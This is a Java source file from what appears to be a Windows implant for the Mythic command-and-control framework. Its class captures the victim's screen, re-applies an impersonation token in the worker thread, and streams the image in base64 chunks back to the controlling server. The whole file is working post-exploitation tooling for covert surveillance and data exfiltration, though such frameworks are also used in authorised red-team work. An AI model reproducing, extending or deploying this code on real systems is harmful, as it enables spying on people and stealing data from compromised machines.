package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.woopsie.Config;
import com.woopsie.utils.SystemInfo;
import com.woopsie.utils.WindowsScreenshot;

import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * Background task for capturing and uploading screenshots
 * Runs in a separate thread and communicates via queues
 */
public class ScreenshotBackgroundTask implements Runnable {
    
    private static final int CHUNK_SIZE = 512000; // 512KB chunks
    private final BackgroundTask task;
    private final Config config;
    private final ObjectMapper objectMapper;
    private final com.sun.jna.platform.win32.WinNT.HANDLE impersonationToken;
    
    public ScreenshotBackgroundTask(BackgroundTask task, Config config, com.sun.jna.platform.win32.WinNT.HANDLE impersonationToken) {
        this.task = task;
        this.config = config;
        this.objectMapper = new ObjectMapper();
        this.impersonationToken = impersonationToken;
    }
    
    @Override
    public void run() {
        try {
            // Re-apply impersonation token if present (each thread needs its own token applied)
            if (impersonationToken != null) {
                Config.debugLog(config, "Re-applying impersonation token in screenshot background thread");
                com.woopsie.utils.WindowsAPI.reApplyToken(impersonationToken);
            }
            
            Config.debugLog(config, "Screenshot background task started: " + task.getTaskId());
            
            // Capture screenshot
            byte[] screenshotData = captureScreenshot();
            
            if (screenshotData == null || screenshotData.length == 0) {
                throw new Exception("Failed to capture screenshot");
            }
            
            Config.debugLog(config, "Screenshot captured: " + screenshotData.length + " bytes");
            
            // Calculate total chunks
            int totalChunks = (int) Math.ceil((double) screenshotData.length / CHUNK_SIZE);
            
            // Send initial download response
            Map<String, Object> downloadInfo = new HashMap<>();
            downloadInfo.put("total_chunks", totalChunks);
            downloadInfo.put("full_path", "");
            downloadInfo.put("host", SystemInfo.getHostname());
            downloadInfo.put("is_screenshot", false);
            downloadInfo.put("chunk_size", CHUNK_SIZE);
            downloadInfo.put("filename", null);
            
            Map<String, Object> initialResponse = new HashMap<>();
            initialResponse.put("task_id", task.getTaskId());
            initialResponse.put("download", downloadInfo);
            
            task.sendResponse(initialResponse);
            Config.debugLog(config, "Sent initial download info: " + totalChunks + " chunks");
            
            // Wait for file_id from Mythic
            JsonNode initialMessage = task.receiveFromTask();
            String fileId = initialMessage.get("file_id").asText();
            Config.debugLog(config, "Received file_id: " + fileId);
            
            // Send all chunks
            int offset = 0;
            for (int chunkNum = 1; chunkNum <= totalChunks; chunkNum++) {
                int chunkLength = Math.min(CHUNK_SIZE, screenshotData.length - offset);
                byte[] chunkBytes = new byte[chunkLength];
                System.arraycopy(screenshotData, offset, chunkBytes, 0, chunkLength);
                offset += chunkLength;
                
                // Encode chunk as base64
                String chunkData = Base64.getEncoder().encodeToString(chunkBytes);
                
                // Create chunk response
                Map<String, Object> chunkResponse = new HashMap<>();
                chunkResponse.put("chunk_num", chunkNum);
                chunkResponse.put("file_id", fileId);
                chunkResponse.put("chunk_data", chunkData);
                chunkResponse.put("chunk_size", chunkLength);
                
                Map<String, Object> result = new HashMap<>();
                result.put("task_id", task.getTaskId());
                result.put("download", chunkResponse);
                
                // Send chunk response
                task.sendResponse(result);
                Config.debugLog(config, "Sent chunk " + chunkNum + " of " + totalChunks);
                
                // Wait for acknowledgment before sending next chunk
                JsonNode ack = task.receiveFromTask();
            }
            
            // Send final completion message
            Map<String, Object> completion = new HashMap<>();
            completion.put("task_id", task.getTaskId());
            completion.put("completed", true);
            completion.put("status", "success");
            completion.put("user_output", fileId);
            
            task.sendResponse(completion);
            Config.debugLog(config, "Screenshot upload completed: " + fileId);
            
        } catch (Exception e) {
            Config.debugLog(config, "Screenshot background task failed: " + e.getMessage());
            if (config.isDebug()) {
                e.printStackTrace();
            }
            
            // Send error response
            Map<String, Object> errorResponse = new HashMap<>();
            errorResponse.put("task_id", task.getTaskId());
            errorResponse.put("completed", true);
            errorResponse.put("status", "error");
            errorResponse.put("user_output", "Screenshot failed: " + e.getMessage());
            
            task.sendResponse(errorResponse);
        }
    }
    
    /**
     * Capture screenshot using Windows GDI API
     * @return PNG image data as byte array
     */
    private byte[] captureScreenshot() {
        try {
            Config.debugLog(config, "Capturing screenshot using Windows GDI");
            
            // Use Windows-specific screenshot capture
            byte[] imageBytes = WindowsScreenshot.captureScreenshot();
            
            Config.debugLog(config, "Screenshot captured successfully");
            return imageBytes;
            
        } catch (Exception e) {
            Config.debugLog(config, "Failed to capture screenshot: " + e.getMessage());
            if (config.isDebug()) {
                e.printStackTrace();
            }
            return null;
        }
    }
}
